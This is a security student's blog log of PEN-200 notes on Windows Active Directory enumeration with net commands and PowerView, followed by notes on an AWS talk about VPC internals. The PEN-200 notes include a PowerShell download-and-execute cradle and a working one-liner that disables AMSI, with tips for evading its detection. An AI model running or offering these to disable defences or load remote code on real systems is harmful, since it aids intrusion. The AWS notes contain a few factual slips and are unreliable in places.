---
title: 'OffSec Live: PEN-200 &amp; AWS Deep Dive'
date: 2022-08-24 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.html
author: 100007
---

# OffSec Live: PEN-200 & AWS Deep Dive

**author:** Nathan Acks  
**date:** 2022-08-24

Notes from OffSec Live in the morning (as usual), and then a few more YouTube videos about AWS this evening.

# OffSec Live: PEN-200 - Active Directory Enumeration & Exploitation, Part 1

The Windows `whoami` supports a lot of flags. For example, `whoami /privs` returns privilege information, while `whoami /all` returns _tons_ of information about the current user.

The Windows host name will be returned by the `hostname` command.

The Windows `systeminfo` command returns _a lot_ of information about the current computer, including the associated domain controller if it’s domain-joined.

Use `net users` to enumerate all local users on Windows.

Use `net users /domain` to enumerate domain users. `Administrator`, `Guest`, and `krbtgt` are all standard Windows domain users.

Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name (and comparing the output of `whoami` and `hostname` will reveal if you’re logged in with a local or domain account).

When viewing information about a Windows user, `net user $USERNAME` will return _local_ user information, while `net user $USERNAME /domain` _domain_ user information.

Local and domain groups can be enumerated in Windows using `net localgroup` and `net group /domain`.

See all Windows administrators for the local system: `net localgroup administrators`

By default, all members of the `Domain Admins` domain group are admins of both the _domain_ and _all_ machines in that domain.

One way to show domain group membership is to use `net group $GROUP /domain`. However, this _doesn’t_ show domain groups that are members of that group; for this you need to use PowerShell.

A good enumeration tool is `PowerView.ps1`.

One tool supplied by `PowerView.ps1` is the `Get-DomainUsers | select name, memberof` command, which gets domain users and associated groups.

The `Get-DomainGroupMember -Identity $GROUP_NAME` command for `PowerView.ps1` will get all domain group members, _including_ nested domain groups.

Another `PowerView.ps1` command is `Get-NetLoggedon | select UserName`, will show all users that previously logged on to the current machine. It requires administrative privileges to be run against remote machines.

The `Get-NetSession` command for `PowerView.ps1` shows all users who are logged in to the current machine _right now_. It can be called _without_ admin privileges from Windows Server systems.

Finally, the `Invoke-UserHunter` command for `PowerView.ps1` bundles up `Get-NetLoggedon` and `Get-NetSession` to hunt for currently logged in domain admins.

You can download a remote script into memory and execute it using PowerShell using `IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")`. You can also load scripts into variables this way (just replace `IEX` with a variable assignment).

Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts). However, there’s a lot of bypasses for this - for example, you can cause the AMSI init function to error out using `[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`.

AMSI traps all PowerShell commands that contain all AMSI-function related strings, however. The search uses regular expressions, and can be bypassed by putting portions of the script you’re trying to call in variables, and then calling these instead. If you really need a one-liner, you can also do some fancy hex code conversion (see the “Bypass AMSI by manual modification” link).

Be aware that AMSI bypasses are _per session_, not global!

- [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
- [Join OffSec Live](https://learn.offensive-security.com/offsec-live-webinars)
- [PowerShellMafia / PowerSploit / Recon / PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)

# Another Day, Another Billion Packets

[AWS re:Invent 2015: Another Day, Another Billion Packets (YouTube)](https://youtu.be/R-n4dDGfQd4)

VPC was originally created to help _Amazon_ migrate their data centers to AWS.

EC2 originally just assigned new instances random IP addresses in the 10.44.x.x range. Every new instance got its own IP address, and there was no concept of unified subnets.

VPCs solve this! Every VPC gets a non-routable network that you choose. VPC subnets can be anything, so long as they (1) don’t overlap and (2) are entirely contained within the VPC network.

VPCs are _not_ VLAN based - there are at most 4096 separate VLAN tags.

VPCs are identified internally with a 128 bit number (8 hex digits).

The VPC mapping service is basically an ARP cache on steroids that understands what EC2 instances and VPCs _are_ and on which physical servers the instances are located. But the mapping service doesn’t _just_ provide L2 information - servers receiving packets also verify that those packets are authentic (that the packet’s server/instance/VPC tuple matches an existing system).

The mapping service also functions as a “virtual gateway”, providing routing information _between_ subnets. One interesting consequence of this is that, while in a traditional network inter- and intra-network routing looks slightly different, in AWS this routing is _exactly_ the same once packets leave a physical server. L2 and L3 routing are essentially unified within AWS.

In practice, the every server contains a dedicated system that caches from the mapping service. In fact, these devices _pro-actively_ cache from the mapping service as instances are spun up within a VPN. _All queries are handled by these caches._

There are two types of caches - caches to individual hosts (EC2) instances, and caches to “edges”, which map to other networks. Direct Connect, VPNs, and internet gateways are implemented at edges.

Edges also function as a 1-to-1 NAT in their role as internet gateways.

Edge devices are called “Blackfoot”, after the South African Blackfoot Penguin.

The last non-AWS Amazon web server was deactivated on November 10, 2010. Since then, Amazon has run 100% on AWS. And Amazon uses the same EC2 instances as everyone else.

Edges can also now route to S3, enabling S3 buckets to be exposed _privately_ within a VPC. Packets routed to S2 buckets configured in this fashion _never_ traverse the public internet - they go out to an edge device and then are routed from there to S3.

S3 buckets can be restricted to particular VPCs, and EC2 instances can be restricted to accessing particular EC2 buckets. All of this is done with the standard Amazon (“Aspen”) policy document structure.

